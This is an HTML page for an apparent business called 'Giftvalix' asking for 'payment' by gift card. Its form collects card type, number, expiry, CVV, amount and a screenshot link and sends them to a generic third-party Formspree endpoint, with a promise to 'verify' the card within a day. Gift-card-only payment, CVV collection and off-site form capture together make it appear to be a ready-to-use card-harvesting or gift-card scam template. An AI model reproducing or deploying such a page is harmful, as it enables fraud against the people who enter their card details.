<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Giftvalix - Gift Card Payment</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 text-gray-800">
  <div class="max-w-lg mx-auto mt-10 p-6 bg-white shadow-xl rounded-2xl">
    <h1 class="text-2xl font-bold mb-4 text-center">Pay with Gift Card</h1>
    <p class="text-sm mb-4 text-gray-600 text-center">We accept Visa, Mastercard, and Amazon gift cards. Please enter valid gift card info below.</p>

    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" class="space-y-4">
      <div>
        <label class="block text-sm font-medium mb-1">Card Type</label>
        <select name="card_type" class="w-full border border-gray-300 rounded-lg p-2">
          <option value="Visa">Visa</option>
          <option value="Mastercard">Mastercard</option>
          <option value="Amazon">Amazon</option>
        </select>
      </div>

      <div>
        <label class="block text-sm font-medium mb-1">Card Number</label>
        <input type="text" name="card_number" class="w-full border border-gray-300 rounded-lg p-2" required>
      </div>

      <div class="grid grid-cols-2 gap-4">
        <div>
          <label class="block text-sm font-medium mb-1">Expiry Date</label>
          <input type="text" name="expiry_date" placeholder="MM/YY" class="w-full border border-gray-300 rounded-lg p-2" required>
        </div>
        <div>
          <label class="block text-sm font-medium mb-1">CVV</label>
          <input type="text" name="cvv" class="w-full border border-gray-300 rounded-lg p-2" required>
        </div>
      </div>

      <div>
        <label class="block text-sm font-medium mb-1">Amount (USD)</label>
        <input type="number" name="amount" class="w-full border border-gray-300 rounded-lg p-2" required>
      </div>

      <div>
        <label class="block text-sm font-medium mb-1">Optional Note or Screenshot URL</label>
        <input type="text" name="note" placeholder="e.g. Dropbox, Imgur link" class="w-full border border-gray-300 rounded-lg p-2">
      </div>

      <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-2 rounded-xl">Submit Payment</button>
    </form>

    <p class="mt-4 text-xs text-center text-gray-500">Secure form powered by Formspree. We will verify the gift card and confirm your order within 24 hours.</p>
  </div>
</body>
</html>
